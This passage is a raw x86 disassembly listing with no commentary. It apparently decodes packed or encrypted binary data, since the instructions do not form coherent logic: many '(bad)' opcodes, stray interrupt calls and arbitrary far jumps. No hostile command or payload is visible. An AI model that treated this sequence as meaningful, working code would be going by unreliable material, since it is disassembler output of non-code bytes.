  425386:	add    ch,cl
  425388:	jbe    0x425383
  42538a:	int    0x8d
  42538c:	mov    BYTE PTR [edx-0x327ef558],ch
  425392:	jbe    0x42538d
  425394:	arpl   bx,cx
  425396:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  42539d:	ins    DWORD PTR es:[edi],dx
  42539e:	pop    esi
  42539f:	jbe    0x4253ed
  4253a1:	aam    0x3a
  4253a3:	pop    esi
  4253a4:	jbe    0x42532e
  4253a6:	fdiv   DWORD PTR [edx]
  4253a8:	retf   0x8814
  4253ab:	or     DWORD PTR [esi-0x69a6d0d1],edx
  4253b1:	das    
  4253b2:	adc    dh,bl
  4253b4:	in     eax,dx
  4253b5:	add    BYTE PTR [eax+0x2f960980],0xf1
  4253bc:	lea    ebp,[edi]
  4253be:	retf   0x2f96
  4253c1:	or     DWORD PTR [eax+ecx*4],edx
  4253c4:	ins    BYTE PTR es:[edi],dx
  4253c5:	inc    ebx
  4253c6:	jbe    0x425350
  4253c8:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  4253cf:	stc    
  4253d0:	std    
  4253d1:	add    BYTE PTR [eax],al
  4253d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253d4:	ror    BYTE PTR [eax-0x12326980],cl
  4253da:	adc    ch,ch
  4253dc:	cmp    al,0x84
  4253de:	add    BYTE PTR [eax+0x49bf985b],0x21
  4253e5:	xchg   BYTE PTR ds:0xc911a60a,dh
  4253eb:	jbe    0x4253ea
  4253ed:	inc    ecx
  4253ee:	and    DWORD PTR [esi-0x128936cb],eax
  4253f4:	dec    ecx
  4253f5:	sub    DWORD PTR [esi-0x4a8936cb],eax
  4253fb:	jno    0x4253b3
  4253fd:	cli    
  4253fe:	arpl   bp,cx
  425400:	jbe    0x425413
  425402:	int    0x8d
  425404:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  42540a:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  425414:	repnz sub BYTE PTR [ebx-0x2d],dl
  425418:	or     dh,BYTE PTR [esi-0x7]
  42541b:	leave  
  42541c:	jbe    0x4253c3
  42541e:	into   
  42541f:	and    DWORD PTR [esi-0x628936cb],eax
  425425:	inc    esi
  425426:	sbb    DWORD PTR [ebp-0x528936de],esi
  42542c:	mov    BYTE PTR [eax-0x34327f80],al
  425432:	int    0x76
  425434:	std    
  425435:	int    0x8d
  425437:	std    
  425438:	cmp    esi,eax
  42543a:	shl    edx,cl
  42543c:	sub    BYTE PTR [ebx],bh
  42543e:	jns    0x425413
  425440:	mov    ebp,0xcdd35392
  425445:	lea    edx,[ecx]
  425447:	int    0x96
  425449:	adc    DWORD PTR [ebx],edi
  42544b:	(bad)  
  42544d:	(bad)  
  42544f:	jmp    0x4253e3
  425451:	shr    edx,cl
  425453:	sub    BYTE PTR [ebx+0x13],dl
  425456:	das    
  425457:	rcl    ebx,1
  425459:	in     al,dx
  42545a:	outs   dx,BYTE PTR ds:[esi]
  42545b:	int    0x76
  42545d:	cmc    
  42545e:	int    0x8d
  425460:	cmc    
  425461:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425467:	push   ebx
  425468:	sar    DWORD PTR [ebx],cl
  42546a:	lds    ecx,FWORD PTR [edx]
  42546c:	jbe    0x425467
  42546e:	iret   
  42546f:	jbe    0x42546a
  425471:	jo     0x425430
  425473:	mov    ecx,0xa0000fe
  425478:	jbe    0x425473
  42547a:	int    0x76
  42547c:	stc    
  42547d:	int    0x8d
  42547f:	cmc    
  425480:	or     al,BYTE PTR ds:0xfc9dcf
  425486:	add    ch,cl
  425488:	jbe    0x425487
  42548a:	int    0x8d
  42548c:	std    
  42548d:	cmp    edi,DWORD PTR [ecx+0x3b]
  425490:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425497:	push   ebx
  425498:	rol    DWORD PTR [edi+0x760af576],cl
  42549e:	cmc    
  42549f:	int    0x76
  4254a1:	in     eax,dx
  4254a2:	int    0x8d
  4254a4:	in     eax,dx
  4254a5:	cmp    esi,eax
  4254a7:	shl    edx,cl
  4254a9:	sub    BYTE PTR [ebx],bh
  4254ab:	jns    0x425480
  4254ad:	mov    ebp,0xcdd35392
  4254b2:	(bad)  
  4254b3:	std    
  4254b4:	int    0x96
  4254b6:	std    
  4254b7:	cmp    ecx,DWORD PTR [edi]
  4254b9:	cmp    ebx,ecx
  4254bb:	shr    ebx,cl
  4254bd:	xchg   edx,eax
  4254be:	shr    edx,cl
  4254c0:	sub    BYTE PTR [ebx+0x13],dl
  4254c3:	xor    edx,ebx
  4254c5:	int    0x8d
  4254c7:	cmc    
  4254c8:	inc    ebx
  4254c9:	jge    0x4254a3
  4254cb:	mov    bl,0xcd
  4254cd:	jbe    0x425484
  4254cf:	int    0x8d
  4254d1:	mov    ch,0x3b
  4254d3:	jns    0x425510
  4254d5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254dc:	push   ebx
  4254dd:	ror    DWORD PTR [edx],cl
  4254df:	jbe    0x4254da
  4254e1:	leave  
  4254e2:	jbe    0x4254d1
  4254e4:	bound  ebx,QWORD PTR [edi]
  4254e6:	xchg   BYTE PTR ds:0x1ebddcd,dh
  4254ec:	add    BYTE PTR [eax-0x5a723280],0xcd
  4254f3:	jbe    0x42549a
  4254f5:	cmp    ecx,ecx
  4254f7:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  4254fd:	jmp    0x425491
  4254ff:	push   ebx
  425500:	jge    0x4254cf
  425502:	jbe    0x4254fd
  425504:	aad    0xbd
  425506:	or     dh,BYTE PTR [esi-0x63]
  425509:	int    0x76
  42550b:	mov    dl,cl
  42550d:	or     BYTE PTR [ecx],0x76
  425510:	in     al,dx
  425511:	retf   0xec76
  425514:	int    0x8d
  425516:	stc    
  425517:	das    
  425518:	pop    ecx
  425519:	ins    DWORD PTR es:[edi],dx
  42551a:	cmp    edx,ebx
  42551c:	or     dh,BYTE PTR [esi-0xb]
  42551f:	int    0x76
  425521:	in     eax,dx
  425522:	int    0x8d
  425524:	in     eax,dx
  425525:	cmp    edi,DWORD PTR [ecx-0x2d]
  425528:	mov    ebp,0xd3f03b92
  42552d:	repnz sub BYTE PTR [ebx-0x2d],dl
  425531:	int    0x8d
  425533:	cmc    
  425534:	sub    edx,ebx
  425536:	int    0x5
  425538:	push   es
  425539:	popf   
  42553a:	cld    
  42553b:	add    BYTE PTR [eax],al
  42553d:	int    0x8d
  42553f:	popf   
  425540:	cmp    edx,ebx
  425542:	or     dh,BYTE PTR [esi-0x7]
  425545:	int    0x76
  425547:	std    
  425548:	int    0x8d
  42554a:	std    
  42554b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42554e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425555:	push   ebx
  425556:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42555c:	std    
  42555d:	int    0x8d
  42555f:	std    
  425560:	cmp    edi,DWORD PTR [ecx+0x3b]
  425563:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42556a:	push   ebx
  42556b:	sar    DWORD PTR [esi],cl
  42556d:	jbe    0x42551c
  42556f:	int    0x76
  425571:	adc    ebp,ecx
  425573:	lea    edx,[ecx]
  425575:	cmp    esi,eax
  425577:	cmp    edi,DWORD PTR [ecx-0x2d]
  42557a:	repnz sub bl,dl
  42557d:	mov    ebp,0xcdd35392
  425582:	lea    ebp,[ebp+0x62f7d43]
  425588:	imul   eax,DWORD PTR [eax],0x0
  42558b:	add    ch,cl
  42558d:	jbe    0x425544
  42558f:	int    0x8d
  425591:	mov    ch,0x3b
  425593:	jns    0x4255d0
  425595:	lock shl edx,cl
  425598:	sub    bl,dl
  42559a:	mov    ebp,0xd353aa92
  42559f:	int    0x8d
  4255a1:	stc    
  4255a2:	test   al,0x3b
  4255a4:	shl    DWORD PTR [ebx-0x35],cl
  4255a7:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  4255ae:	in     eax,dx
  4255af:	xor    BYTE PTR [ebx],bh
  4255b1:	retf   
  4255b2:	pop    ebx
  4255b3:	call   0xbb05:0x2f888d5e
  4255ba:	add    BYTE PTR [eax+0x2f024380],0x5
  4255c1:	rol    DWORD PTR [eax-0x44d07f80],1
  4255c7:	cwde   
  4255c8:	sub    al,0x5d
  4255ca:	lahf   
  4255cb:	xor    eax,0x8d0a8080
  4255d0:	std    
  4255d1:	or     cl,BYTE PTR [ebp+0xaf13b11]
  4255d7:	(bad)  
  4255d8:	stc    
  4255d9:	mov    eax,0xe3b813cd
  4255de:	retf   
  4255df:	cmp    eax,DWORD PTR [eax]
  4255e1:	leave  
  4255e2:	jbe    0x4255d9
  4255e4:	adc    al,0x80
  4255e6:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  4255ed:	mov    eax,0xb8fde6cd
  4255f2:	jecxz  0x4255bd
  4255f4:	mov    eax,0xbb2ff93b
  4255f9:	(bad)  
  4255fa:	stc    
  4255fb:	iret   
  4255fc:	dec    esp
  4255fd:	into   
  4255fe:	mov    eax,0xd692de5e
  425603:	pop    edx
  425604:	das    
  425605:	mov    ebx,0xf58d0a89
  42560a:	mov    eax,0x4dd67d43
  42560f:	das    
  425610:	mov    ebx,0xa6cdfd8d
  425615:	mov    BYTE PTR [ecx],al
  425617:	fs push ds
  425619:	adc    ah,0x3b
  42561c:	das    
  42561d:	mov    ebx,0xa6cdfd8d
  425622:	mov    BYTE PTR [eax+0x1e4c692f],bh
  425628:	mov    eax,0x3bb8d3e3
  42562d:	jge    0x4255e7
  42562f:	pop    esi
  425630:	(bad)  
  425631:	cmc    
  425632:	aam    0x23
  425634:	leave  
  425635:	jbe    0x42562c
  425637:	sbb    BYTE PTR [eax+0x76008080],al
  42563d:	stc    
  42563e:	int    0x7d
  425640:	mov    eax,0xb82c8e3b
  425645:	jecxz  0x425612
  425647:	mov    eax,0x82f98d5e
  42564c:	inc    ecx
  42564d:	in     al,dx
  42564e:	dec    edx
  42564f:	add    BYTE PTR [esi+0x11],dh
  425652:	leave  
  425653:	jbe    0x42564a
  425655:	push   ss
  425656:	add    BYTE PTR [eax-0x1944d080],0xfd
  42565d:	int    0xa6
  42565f:	mov    BYTE PTR [ebx],bh
  425661:	retf   
  425662:	pop    esp
  425663:	dec    esp
  425664:	sub    dl,ah
  425666:	push   ss
  425667:	add    BYTE PTR [esi-0x3],dh
  42566a:	add    al,0xe6
  42566c:	cmc    
  42566d:	sbb    BYTE PTR [edi],ch
  42566f:	push   es
  425670:	jb     0x425672
  425672:	add    BYTE PTR [eax],al
  425674:	cmp    ebp,DWORD PTR [ebp-0x56]
  425677:	arpl   bx,cx
  425679:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  425680:	jecxz  0x425655
  425682:	mov    eax,0x6d3b7d3b
  425687:	mov    eax,0x2f2c8e43
  42568c:	adc    eax,0x96b9ec6d
  425691:	int    0xed
  425693:	add    al,0xed
  425695:	mov    esp,0xc09a985b
  42569a:	inc    esp
  42569b:	add    dh,dl
  42569d:	mov    ch,cl
  42569f:	adc    DWORD PTR [ebp+0xf90b],edi
  4256a5:	iret   
  4256a6:	js     0x4256da
  4256a8:	or     dh,BYTE PTR [esi+0x25]
  4256ab:	iret   
  4256ac:	js     0x425722
  4256ae:	or     dh,BYTE PTR [esi+0x2d]
  4256b1:	iret   
  4256b2:	js     0x42566c
  4256b4:	or     dh,BYTE PTR [esi+0x35]
  4256b7:	iret   
  4256b8:	pop    es
  4256b9:	or     DWORD PTR [eax+0x760a8080],eax
  4256bf:	cmp    eax,0x804107cf
  4256c4:	add    BYTE PTR [eax-0x30ba89f6],0x7
  4256cb:	or     eax,0xa808080
  4256d0:	jbe    0x4256a2
  4256d2:	iret   
  4256d3:	pop    es
  4256d4:	out    dx,eax
  4256d5:	add    BYTE PTR [eax+0x55760a80],0xcf
  4256dc:	pop    es
  4256dd:	xor    BYTE PTR [ecx+0x760a8080],al
  4256e3:	pop    ebp
  4256e4:	iret   
  4256e5:	pop    es
  4256e6:	inc    edx
  4256e7:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  4256f1:	pop    es
  4256f2:	xchg   esp,eax
  4256f3:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  4256fd:	add    BYTE PTR [eax-0x25c4af33],0xa
  425704:	xchg   esi,eax
  425705:	icebp  
  425706:	or     dl,BYTE PTR [esi-0x6269f56b]
  42570c:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  425712:	(bad)  
  425713:	mov    cl,0xde
  425715:	adc    ebx,DWORD PTR [ebp-0x43]
  425718:	or     ah,BYTE PTR [ebx]
  42571a:	and    eax,0xcd0d760a
  42571f:	lea    edi,[ebp-0x33]
  425722:	out    0xd,al
  425724:	cmp    edi,ecx
  425726:	adc    al,BYTE PTR [edx]
  425728:	jnp    0x425761
  42572a:	ficom  WORD PTR [ebx]
  42572c:	das    
  42572d:	inc    ebp
  42572e:	cli    
  42572f:	xchg   edx,eax
  425730:	rcl    DWORD PTR [eax],cl
  425732:	xchg   edx,eax
  425733:	or     ah,dh
  425735:	mov    ch,0xcd
  425737:	out    0x7d,al
  425739:	int    0xa6
  42573b:	or     eax,0x3be1cd
  425740:	cmp    eax,DWORD PTR [ebx]
  425742:	shl    ebp,cl
  425744:	sub    BYTE PTR [ebx-0x10],dl
  425747:	int    0xe6
  425749:	mov    ch,0x61
  42574b:	add    BYTE PTR [eax-0x1dc49380],0x53
  425752:	cld    
  425753:	push   ebx
  425754:	lock or dl,dh
  425757:	stc    
  425758:	das    
  425759:	add    eax,0x808080f2
  42575e:	adc    dh,BYTE PTR [esi-0xf]
  425761:	(bad)  
  425762:	mov    esp,0xeb5f8bbd
  425767:	or     ah,BYTE PTR [ebx]
  425769:	and    eax,0x12958d31
  42576e:	jbe    0x42570d
  425770:	(bad)  
  425771:	mov    esp,0x8d318790
  425776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425777:	int    0x8d
  425779:	jge    0x425748
  42577b:	(bad)  
  42577c:	or     eax,0xcd7de6cd
  425781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425782:	or     eax,0x212113b
  425787:	jnp    0x4257c0
  425789:	ficom  WORD PTR [ebx]
  42578b:	das    
  42578c:	inc    ebp
  42578d:	add    dl,BYTE PTR [edx-0x2cd7162d]
  425793:	out    dx,eax
  425794:	xchg   edx,eax
  425795:	cmp    ebx,ebp
  425797:	cmp    eax,DWORD PTR [ebx]
  425799:	push   ebx
  42579a:	or     al,0x53
  42579c:	clc    
  42579d:	add    al,0xd3
  42579f:	add    BYTE PTR [ecx+ebx*4],al
  4257a2:	add    BYTE PTR [edx],cl
  4257a4:	lea    edi,[ebp+0xa]
  4257a7:	(bad)  
  4257a8:	or     eax,0x53f18dcd
  4257ad:	lea    edx,[ebp+0x761223d4]
  4257b3:	icebp  
  4257b4:	mov    edx,DWORD PTR [ebx]
  4257b6:	dec    edx
  4257b7:	stc    
  4257b8:	pop    edi
  4257b9:	sbb    al,bl
  4257bb:	mov    ch,0x6b
  4257bd:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  4257c3:	(bad)
  4257c6:	std    
  4257c7:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  4257cd:	(bad)  
  4257ce:	icebp  
  4257cf:	(bad)  
  4257d0:	mov    esp,0x76897abd
  4257d5:	xchg   ebp,eax
  4257d6:	adc    dh,BYTE PTR [esi-0x6f433963]
  4257dc:	add    al,0x12
  4257de:	mov    dh,0xa5
  4257e0:	jmp    0x4257ec
  4257e2:	and    esp,DWORD PTR ds:0xcd7d8dcd
  4257e8:	lea    ecx,ds:0xcd7de6cd
  4257ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257ef:	or     eax,0x92fc352f
  4257f4:	shr    ebx,cl
  4257f6:	sub    BYTE PTR [ebx],bh
  4257f8:	not    DWORD PTR [ebx-0xc]
  4257fb:	shr    ecx,cl
  4257fd:	xchg   edx,eax
  4257fe:	push   ebx
  4257ff:	lock adc al,BYTE PTR [edx]
  425802:	(bad)  
  425803:	aaa    
  425804:	ficom  WORD PTR [ebx]
  425806:	or     cl,BYTE PTR [ebp+0xa113b7d]
  42580c:	(bad)  
  42580d:	or     eax,0xcd7d8dcd
  425812:	(bad)  
  425813:	or     eax,0xcd7de6cd
  425818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425819:	or     eax,0x212113b
  42581e:	jnp    0x425857
  425820:	ficom  WORD PTR [ebx]
  425822:	das    
  425823:	inc    ebp
  425824:	add    dl,BYTE PTR [edx-0x2cd7162d]
  42582a:	out    dx,eax
  42582b:	xchg   edx,eax
  42582c:	cmp    ebx,ebp
  42582e:	cmp    eax,DWORD PTR [ebx]
  425830:	push   ebx
  425831:	or     al,0x53
  425833:	clc    
  425834:	push   ebx
  425835:	comiss xmm0,DWORD PTR [esi]
  425838:	xor    al,BYTE PTR [eax]
  42583a:	add    BYTE PTR [eax],al
  42583c:	int    0xd6
  42583e:	stc    
  42583f:	push   es
  425840:	imul   DWORD PTR [edi]
  425842:	add    eax,0x808080d1
  425847:	int    0x78
  425849:	fs int 0xe4
  42584c:	push   eax
  42584d:	fadd   QWORD PTR [edi+0x349acdff]
  425853:	int    0x6f
  425855:	and    al,0xcd
  425857:	jp     0x425885
  425859:	int    0xaa
  42585b:	sbb    al,0x87
  42585d:	cdq    
  42585e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425864:	xchg   DWORD PTR [edi],ecx
  425866:	xchg   DWORD PTR [ecx+0xa],edi
  425869:	(bad)  
  42586a:	in     eax,dx
  42586b:	or     dh,BYTE PTR [esi-0x6b]
  42586e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  425874:	xchg   DWORD PTR [edx],ecx
  425876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425877:	cmc    
  425878:	cmp    ebx,edx
  42587a:	or     dl,BYTE PTR [esi-0xa69a15b]
  425880:	fcom   st(4)
  425882:	in     al,dx
  425883:	xchg   ebp,ecx
  425885:	jbe    0x42581c
  425887:	int    0xa6
  425889:	or     eax,0x5b24bb2f
  42588e:	inc    ebx
  42588f:	call   0x14aa:0x436b771c
  425896:	ja     0x425840
  425898:	int    0x84
  42589a:	mov    al,0xcd
  42589c:	xchg   esi,eax
  42589d:	mov    ch,cl
  42589f:	and    al,0x1f
  4258a1:	or     dl,BYTE PTR [esi-0x30867803]
  4258a7:	xchg   esi,eax
  4258a8:	sbb    eax,0x9633a987
  4258ad:	mov    BYTE PTR [edx],cl
  4258af:	jbe    0x4258c2
  4258b1:	or     dl,BYTE PTR [esi-0x4a89368b]
  4258b7:	push   ebx
  4258b8:	add    BYTE PTR [eax-0x2693280],0x4
  4258bf:	pusha  
  4258c0:	adc    dh,0x28
  4258c3:	jo     0x425892
  4258c5:	jbe    0x42593c
  4258c7:	int    0x54
  4258c9:	xor    BYTE PTR [ebp+0xfddd],bh
  4258cf:	int    0xd6
  4258d1:	stc    
  4258d2:	int    0x8d
  4258d4:	in     eax,dx
  4258d5:	push   es
  4258d6:	ins    DWORD PTR es:[edi],dx
  4258d7:	aam    0x85
  4258d9:	int    0x76
  4258db:	std    
  4258dc:	or     bl,BYTE PTR [ecx*8+0x76041176]
  4258e3:	std    
  4258e4:	test   BYTE PTR [eax],al
  4258e6:	lea    esi,[ebp-0x69321c2a]
  4258ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258ed:	push   edx
  4258ee:	or     dl,BYTE PTR [esi-0xa69bc5b]
  4258f4:	or     dh,0xaa
  4258f7:	int    0x79
  4258f9:	test   al,0x63
  4258fb:	retf   
  4258fc:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  425903:	int    0xd6
  425905:	mov    BYTE PTR [eax],al
  425907:	pop    ecx
  425908:	adc    DWORD PTR [ecx+0x76cd8080],eax
  42590e:	mov    BYTE PTR [ebp+0xfee4],bh
  425914:	int    0x7
  425916:	cmp    eax,0x3b808081
  42591b:	retf   
  42591c:	pop    esi
  42591d:	mov    BYTE PTR [eax-0x322ce8d1],ch
  425923:	shl    DWORD PTR [esi-0x327f7b2e],cl
  425929:	fwait
  42592a:	sbb    eax,0x5b808081
  42592f:	cwde   
  425930:	int    0x11
  425932:	pop    ebp
  425933:	lahf   
  425934:	xor    eax,0x4eec8080
  425939:	cmp    edi,DWORD PTR [ebp-0x48]
  42593c:	jecxz  0x425909
  42593e:	mov    eax,0xd2044a0a
  425943:	xchg   edx,eax
  425944:	add    al,0x79
  425946:	xchg   edx,eax
  425947:	das    
  425948:	mov    ebx,0x7d43b84e
  42594d:	(bad)  
  42594e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425952:	mov    eax,0x8cd920a
  425957:	sbb    eax,0x63808081
  42595c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425962:	sbb    eax,0xd3808081
  425967:	jmp    0xed0be0f2
  42596c:	dec    edx
  42596d:	add    DWORD PTR [edx],eax
  42596f:	add    DWORD PTR [ecx],0xffffffeb
  425972:	mov    esi,0x526c8809
  425977:	retf   0x14a
  42597a:	cli    
  42597b:	sbb    dh,dl
  42597d:	adc    BYTE PTR [ecx-0x80],bh
  425980:	or     ch,0x7
  425983:	sbb    eax,0x87808081
  425988:	leave  
  425989:	stos   BYTE PTR es:[edi],al
  42598a:	lds    edx,FWORD PTR [esi-0x12ed1233]
  425990:	mov    al,0x80
  425992:	add    BYTE PTR [eax+0xabd5f5b],0x23
  425999:	and    eax,0x76c99a98
  42599e:	cmc    
  42599f:	xchg   ecx,eax
  4259a0:	aaa    
  4259a1:	ficom  WORD PTR [ebx]
  4259a3:	or     cl,BYTE PTR [ebp-0x12893607]
  4259a9:	(bad)  
  4259aa:	aaa    
  4259ab:	ficom  WORD PTR [ebx]
  4259ad:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  4259b3:	jbe    0x425972
  4259b5:	dec    ecx
  4259b6:	and    DWORD PTR [esi-0x28936cb],eax
  4259bc:	inc    ecx
  4259bd:	and    DWORD PTR [esi-0xe8936cb],eax
  4259c3:	out    0x37,al
  4259c5:	ficom  WORD PTR [ebx]
  4259c7:	or     cl,BYTE PTR [ebp+0x5d76c995]
  4259cd:	fidiv  WORD PTR [edi]
  4259cf:	ficom  WORD PTR [ebx]
  4259d1:	or     cl,BYTE PTR [ebp-0x1289329b]
  4259d7:	int    0x96
  4259d9:	adc    DWORD PTR [edi],ebp
  4259db:	inc    ebp
  4259dc:	icebp  
  4259dd:	xchg   edx,eax
  4259de:	shl    ebx,cl
  4259e0:	xchg   edx,eax
  4259e1:	int    0x96
  4259e3:	in     eax,dx
  4259e4:	int    0xd6
  4259e6:	adc    ebx,edx
  4259e8:	jmp    0x4229:0xbea6c328
  4259ef:	cmp    ecx,ecx
  4259f1:	cmp    esi,edi
  4259f3:	push   ebx
  4259f4:	jns    0x425a00
  4259f6:	jbe    0x42599d
  4259f8:	iret   
  4259f9:	jbe    0x4259a8
  4259fb:	or     dh,BYTE PTR [esi+0xd]
  4259fe:	int    0x76
  425a00:	or     eax,0x8621d169
  425a05:	xor    eax,0x37b680c9
  425a0a:	ficom  WORD PTR [ebx]
  425a0c:	or     bh,BYTE PTR [esp+eax*4-0x33]
  425a10:	(bad)  
  425a11:	std    
  425a12:	int    0x96
  425a14:	std    
  425a15:	cmp    ecx,DWORD PTR [edi]
  425a17:	shr    ebx,cl
  425a19:	xchg   edx,eax
  425a1a:	sar    bh,0x9c
  425a1d:	cmp    esi,ecx
  425a1f:	shr    edx,cl
  425a21:	sub    BYTE PTR [ebx+0x13],dl
  425a24:	int    0x96
  425a26:	std    
  425a27:	int    0xa6
  425a29:	std    
  425a2a:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a30:	popf   
  425a31:	shl    ebp,cl
  425a33:	sub    BYTE PTR [ebx-0x2b],dl
  425a36:	xchg   DWORD PTR [ebx],edx
  425a38:	int    0x96
  425a3a:	std    
  425a3b:	int    0xa6
  425a3d:	std    
  425a3e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a44:	popf   
  425a45:	shl    ebp,cl
  425a47:	sub    BYTE PTR [ebx-0x2b],dl
  425a4a:	xchg   DWORD PTR [ebx],edx
  425a4c:	int    0x96
  425a4e:	std    
  425a4f:	int    0xa6
  425a51:	std    
  425a52:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a58:	popf   
  425a59:	shl    ebp,cl
  425a5b:	sub    BYTE PTR [ebx-0x2b],dl
  425a5e:	xchg   DWORD PTR [ebx],edx
  425a60:	or     cl,bh
  425a62:	nop
  425a63:	add    BYTE PTR [eax],al
  425a65:	add    ch,cl
  425a67:	lea    edi,[ebp+0x3bbd96cd]
  425a6d:	icebp  
  425a6e:	cmp    ecx,DWORD PTR [edi]
  425a70:	shr    edx,cl
  425a72:	sub    bl,dl
  425a74:	jmp    0x425a08
  425a76:	push   ebx
  425a77:	adc    ecx,ebp
  425a79:	xchg   esi,eax
  425a7a:	mov    ebp,0x3bbda6cd
  425a7f:	cdq    
  425a80:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425a86:	in     eax,0x28
  425a88:	push   ebx
  425a89:	aad    0xa
  425a8b:	int3   
  425a8c:	pop    ss
  425a8d:	aam    0x0
  425a8f:	add    BYTE PTR [eax],al
  425a91:	int    0x8d
  425a93:	dec    esp
  425a94:	int    0x89
  425a96:	int    0x96
  425a98:	std    
  425a99:	int    0xa6
  425a9b:	std    
  425a9c:	int    0x7e
  425a9e:	jo     0x425adb
  425aa0:	popf   
  425aa1:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425aa7:	in     eax,0x28
  425aa9:	push   ebx
  425aaa:	aad    0xa
  425aac:	int3   
  425aad:	pop    ss
  425aae:	aam    0x0
  425ab0:	add    BYTE PTR [eax],al
  425ab2:	int    0x8d
  425ab4:	xor    ch,cl
  425ab6:	xchg   esi,eax
  425ab7:	xor    BYTE PTR [ebx],bh
  425ab9:	icebp  
  425aba:	cmp    ecx,DWORD PTR [edi]
  425abc:	shr    edx,cl
  425abe:	sub    bl,dl
  425ac0:	jmp    0x425a54
  425ac2:	push   ebx
  425ac3:	adc    ecx,ebp
  425ac5:	xchg   esi,eax
  425ac6:	std    
  425ac7:	int    0xa6
  425ac9:	std    
  425aca:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425ad0:	cdq    
  425ad1:	shl    ebx,cl
  425ad3:	xchg   edx,eax
  425ad4:	shl    ebp,cl
  425ad6:	sub    BYTE PTR [ebx-0x2b],dl
  425ad9:	int    0xa6
  425adb:	std    
  425adc:	cmp    edi,DWORD PTR [ecx-0x2d]
  425adf:	mov    ebp,0xfff40492
  425ae4:	shl    ebp,cl
  425ae6:	sub    BYTE PTR [ebx-0x3b],dl
  425ae9:	xchg   ecx,esi
  425aeb:	int    0x76
  425aed:	adc    al,0xa
  425aef:	int3   
  425af0:	pop    ss
  425af1:	aam    0x0
  425af3:	add    BYTE PTR [eax],al
  425af5:	int    0x8d
  425af7:	adc    al,0x4
  425af9:	add    bh,bh
  425afb:	shl    edx,cl
  425afd:	sub    BYTE PTR [ebx],bh
  425aff:	jns    0x425ad4
  425b01:	mov    ebp,0xcdd35392
  425b06:	(bad)  
  425b07:	std    
  425b08:	int    0x96
  425b0a:	std    
  425b0b:	add    al,0xfb
  425b0d:	(bad)  
  425b0e:	cmp    ecx,DWORD PTR [edi]
  425b10:	shr    edx,cl
  425b12:	sub    bl,dl
  425b14:	jmp    0x425aa8
  425b16:	push   ebx
  425b17:	adc    ecx,ebp
  425b19:	xchg   esi,eax
  425b1a:	std    
  425b1b:	int    0xa6
  425b1d:	std    
  425b1e:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b24:	repz xchg edx,eax
  425b26:	shl    ebp,cl
  425b28:	sub    BYTE PTR [ebx-0x2b],dl
  425b2b:	xchg   DWORD PTR [ebx],edx
  425b2d:	int    0x96
  425b2f:	std    
  425b30:	int    0xa6
  425b32:	std    
  425b33:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b39:	in     eax,0x28
  425b3b:	shl    ebx,cl
  425b3d:	xchg   edx,eax
  425b3e:	push   ebx
  425b3f:	aad    0x87
  425b41:	adc    ecx,DWORD PTR [edx]
  425b43:	add    eax,0xd4cf
  425b48:	add    bh,cl
  425b4a:	push   es
  425b4b:	nop
  425b4c:	add    BYTE PTR [eax],al
  425b4e:	add    BYTE PTR [eax-0x33],dh
  425b51:	jbe    0x425b50
  425b53:	int    0x8d
  425b55:	std    
  425b56:	sar    bh,0x63
  425b59:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b5c:	or     al,0xd3
  425b5e:	mov    ebp,0x28f2d392
  425b63:	push   ebx
  425b64:	shl    DWORD PTR [eax-0x33],cl
  425b67:	jbe    0x425b95
  425b69:	iret   
  425b6a:	or     DWORD PTR [ecx-0x80],eax
  425b6d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425b74:	add    BYTE PTR [eax-0x69ffb000],0x24
  425b7b:	int    0x8d
  425b7d:	push   esp
  425b7e:	or     al,BYTE PTR [ecx-0x32528933]
  425b84:	lea    esi,[ebp-0x6d82bad1]
  425b8a:	shr    ebx,cl
  425b8c:	xchg   edx,eax
  425b8d:	int    0x8d
  425b8f:	lods   eax,DWORD PTR ds:[esi]
  425b90:	int    0x96
  425b92:	mov    ch,0x3b
  425b94:	leave  
  425b95:	cmp    ebx,edx
  425b97:	push   ebx
  425b98:	icebp  
  425b99:	bound  eax,QWORD PTR [eax]
  425b9b:	(bad)  
  425b9c:	xor    al,0xd3
  425b9e:	repnz sub BYTE PTR [eax],al
